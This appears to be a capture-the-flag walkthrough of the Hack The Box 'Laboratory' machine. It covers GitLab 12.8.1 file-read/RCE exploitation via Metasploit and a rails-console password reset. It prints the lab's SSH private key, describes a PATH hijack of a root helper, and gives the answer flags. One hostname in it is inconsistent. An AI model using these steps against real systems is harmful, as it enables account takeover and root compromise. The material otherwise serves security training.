# Laboratory

Machine IP:  10.10.10.216 

## Initial enumeration 

`nmap -sC -sV 10.10.10.216`
```s
Nmap 7.80 scan initiated 
Thu Dec 31 00:50:14 2020 as: nmap -sC -sV -oA scan 10.10.10.216 
Nmap scan report for 10.10.10.216 Host is up (0.33s latency). 
Not shown: 997 filtered ports 
PORT STATE SERVICE VERSION 
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) 
80/tcp open http Apache httpd 2.4.41
 |_http-server-header: Apache/2.4.41 (Ubuntu)
 |_http-title: Did not follow redirect to https://laboratory.htb/
443/tcp open ssl/http Apache httpd 2.4.41 ((Ubuntu))
 |_http-server-header: Apache/2.4.41 (Ubuntu)
 |_http-title: The Laboratory
 | ssl-cert: Subject: commonName=laboratory.htb
 | Subject Alternative Name: DNS:git.laboratory.htb
 | Not valid before: 2020-07-05T10:39:28
 |_Not valid after: 2024-03-03T10:39:28
 | tls-alpn:
 |_ http/1.1
Service Info:
 Host: laboratory.htb;
 OS: Linux;
 CPE: cpe:/o:linux:linux_kernel 
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 
Nmap done at Thu Dec 31 00:51:13 2020 -- 1 IP address (1 host up) scanned in 59.08 seconds
```

The address resolution for `http://10.10.10.216:80/` will redirect to `https://laboratory.htb` (Notice the secure HTTP connection and port 443 open (which works for encrypted HTTP traffic)). Add this to `/etc/hosts`.

## Port 80

Redirects to port 443

## Port 443

- Has a single webpage. All links remain on the same webpage. Source of `index.html` points to two pages (commented code) `generic.html` and `element.html` but both are non-existent.

- Has the directory `assets/` visible which seems strange. Normal folders (`/css`, `/js`, and `/fonts`). An interesting subdirectory is the `/sass` subdirectory. Contains `.scss` files which are like CSS but with better formatting.

- Another open directory `images/`

- Another forbidden directory 'server-status/'

## Getting to the virtual host

- There was nothing in the actual site, so there was something I was missing. And it was always before me. The nmap scan revealed `git.laboratory.htb` as the alternative DNS. Adding it to `/etc/hosts` and we arrive to the Gitlab Community Version.

- The certificate to the site is self-signed.

- You might see that any sample email domain is not taken in by the Register page. So I wondered the only domain correct was `@laboratory.htb` and it was right. After all the developers wanted only their people to get on-board.

- The exploit for Ready does not work in here for some reason.

- There is `robots.txt` available which is similar to the file found in Ready.

- Two decent users come up: `https://git.laboratory.htb/dexter` and `https://git.laboratory.htb/seven`.

- dexter has in his repo that old website. Nothing exciting there. But seven has raised an issue against the website:

```
Hi, I cloned this website and when I try to launch my server it gives a HTTP 418 response. How to fix please?
```

Two things come out of this: they cloned it and the response is HTTP 418. HTTP 418 is 'I'm a teapot' thing. This implies the server responds back it can't handle the request, but there may be other servers who can. This isn't very helpful to us in this case.

## Finding an exploit

- To find an exploit, need a version for the GitLab. After signing in, there's a help section which reveals the section `GitLab Community Edition 12.8.1`.

- Arbitrary file read: `https://github.com/thewhiteh4t/cve-2020-10977`

- RCE: `https://github.com/dotPY-hax/gitlab_RCE`

- A report: `https://hackerone.com/reports/827052` (read `vakzz`'s report regarding the RCE using the same thing)

- A metasploit module exists and thus `msfconsole` can be used. Find the module at `https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/gitlab_file_read_rce.rb`. Before the module can work, RHOSTS must have `10.10.10.216` and `VHOST` should be `git.laboratory.com`. However, the module doesn't work unless `SSL` is set to `true` and `RPORT` is 443. This is imperative.

## Foothold enumeration

- The initial shell is unstable. Use `python3 -c "import pty; pty.spawn('/bin/bash');"

- Checking `/proc/1/cgroup` reveals being inside the docker container.

- Launch the `gitlab-rails console` by entering the same command (`gitlab-rails console`) into the shell and change dexter's password as did in Ready.

gitlab-rails runner 'user = User.find_by(email: "admin@example.com"); user.password = "pass_peass_pass"; user.password_confirmation = "pass_peass_pass"; user.save!'

```s
gitlan-rails console

user = User.find(1) -- ID = 1 from /autocomplete/users
 user.password = 'secret_pass'
 user.password_confirmation = 'secret_pass'
 user.save!
```
Now sign in dexter's ID using `dexter` as username and `secret_pass` as password.

- `dexter` has some confidential repo where he has posted the `ssh` keys.

- `authorized_keys`: public key stored in `.ssh/authorized_keys`

```s
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCxl8OPcBJ1vlhLczCOwPz7km+d6VSz7IjbtW4MPs/bWh1J81SAIK2hIT6/yw81oH/EXQJWpAe2eGdZ7qd3FdYfBvfhROh2rqDac6W+05D0hPFJ68NJwz9y0jqHjZ0UGGz7xxb25LE7CUVHhvvQT62/cEzdahaDCle+C4/a5kXhJQ1Yr/x2z1PFhboLVaQALxnbkzse0td/Va5dT/aOfDb1vODM7ikk+8wdTFdXA3zf2MBOBCU2nn25AMFSJxd7Can/klIus49BKQOsRgCckwHh/1E13JsLoS+ZeyBL1+jgsbKFIC4W1PU6OrI5jW7AsZakviNwPEqJ+4Iw8t/mClJAe/DR+rr+EXhKmoziJcMZjunnbB7Qp6TeE/QOpC0S+7EJrvCmfcjW0qw2ZqCdd2oHeQirloRsZIRJthMBS+HjmDDaCTSX7dOw7NZWjCxomrmQLIObjHR+DwF9w+SQp+KL0qc0qyd1cgfSuDRCWU+MAL9kaGyNZJEbj2s/Kh9diu8= root@laboratory
```

- `private key`:

```s
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

- Save this private key as `sshkey.private` and chmod it to 600.

```s
ssh dexter@10.10.10.216 -p 22 -i sshkey.private
```

User flag: `98d9290eba748b4f15e1eb946256e6c5`

## Further Enumeration

- We are not in a docker container anymore. Found this through `/proc/1/cgroup`.

- Further enumeration through `linpeas.sh`

```s
Uncommon password files:

passwd file: /etc/pam.d/passwd
passwd file: /usr/bin/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd
```

Unmounted drive: `/dev/disk/by-uuid/40bcba88-4ce0-46d0-a710-432eecda544c`

Keyring folder: /usr/share/keyrings
```s
/usr/share/keyrings:
total 32
-rw-r--r-- 1 root root 2236 Mar 30  2020 ubuntu-advantage-esm-apps.gpg
-rw-r--r-- 1 root root 2264 Mar 30  2020 ubuntu-advantage-esm-infra-trusty.gpg
-rw-r--r-- 1 root root 7399 Sep 17  2018 ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 6713 Oct 27  2016 ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 4097 Feb  6  2018 ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root    0 Jan 17  2018 ubuntu-cloudimage-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 27  2010 ubuntu-master-keyring.gpg
```

Files with capabilities:
```s
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```
Unexpected in root
```s
/libx32
/lost+found
/lib32
```

Config files things:

```s
/etc/adduser.conf
passwd
 /etc/debconf.conf
passwords.
password
passwords.
passwords
password
passwords.dat
passwords and one for everything else.
passwords
password is really
Passwd: secret
 /etc/sysctl.d/10-ptrace.conf
credentials that exist in memory (re-using existing SSH connections,
 /etc/overlayroot.conf
password is randomly generated
password will be stored for recovery in
passwd
password,mkfs=0
PASSWORD="foobar"
PASSWORD" |
PASSWORD" |
PASSWORD HERE IN THIS CLEARTEXT CONFIGURATION
passwords are more secure, but you won't be able to
passwords are generated by calculating the sha512sum
 /etc/apache2/apache2.conf
passwd files from being
 /etc/nsswitch.conf
passwd:         files systemd
```

- There is a `docker-security` in `/usr/local/bin` and a `###DONE` in `todo.txt` on dexter's profile saying `automate docker security on startup`.

## Privilege escalation

Upon `ltrace` of `docker-security`, we find that it executed `chmod` without specifying the full path. Hence, this must be hijacked.

- Create a new file `chmod` in some obscure directory and put `/bin/bash` in it.

- Override the default path to this obscure directory.

- Execute `docker-security`. It will now run `/bin/bash` and give the root shell.

- Restore the system path.

Root flag: `fb095c6dc0d89b622d8f9344a2e25a8a`
